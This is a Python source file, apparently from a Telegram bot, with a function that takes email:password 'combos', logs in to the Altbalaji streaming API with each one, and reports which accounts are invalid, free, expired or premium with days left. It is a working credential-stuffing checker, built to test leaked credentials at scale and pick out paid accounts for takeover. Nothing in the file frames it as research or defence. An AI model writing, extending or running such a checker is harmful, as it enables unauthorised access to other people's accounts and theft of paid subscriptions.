import requests
from datetime import date
from message import Editmessage, Sendmessage, logger

def altbalaji_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking...</i>')
    try:
        combo_split = combo.split(':')
        inpumail = combo_split[0]
        inpupass = combo_split[1]
    except IndexError:
        return Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
    email= f'"username":"{inpumail}"'
    password = f'"password":"{inpupass}"'

    session_request = requests.Session()
    url = 'https://api.cloud.altbalaji.com/accounts/login?domain=IN'
    payload = '{%s,%s}' %(email, password)
    response = session_request.post(url, data=payload)
    result = response.json()
    if response.status_code != 200:
        state=result['status']
        code=result['code']
        messg = result['message']
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: Altbalaji</b>'
        Editmessage(chat_id, text, status)
        return
    session_token = result['session_token']
    subs_url = 'https://payment.cloud.altbalaji.com/accounts/orders?limit=1&domain=IN'
    head2 = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'content-type': 'application/json',
        'xssession': str(session_token),
    }
    response = session_request.get(subs_url, headers=head2)
    result = response.json()
    if result['orders'] == []:
         expired_text = f'<b>Free Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Free</b>'
         Editmessage(chat_id, expired_text, status)
         return
    validto = result['orders'][0]['dates']['valid_to']
    validtosplit = validto.split('T')[0]
    sub2split = validtosplit.split('-')
    trial = date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) < date.today() 
    if trial:
        free_text = f'<b>Expired Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired/Free</b>'
        Editmessage(chat_id, free_text, status)
        return
    days = date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) - date.today()
    subscription = result['orders'][0]['product']['titles']
    Pack_name = subscription['default']
    Pack_recur = str(result['orders'][0]['product']['recurring'])
    Pack_date = subscription['en']
    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nType: {Pack_date}\nDays Left: {days.days}\nRecurring: {Pack_recur.capitalize()}</b>'
    Editmessage(chat_id, pro_message, status)
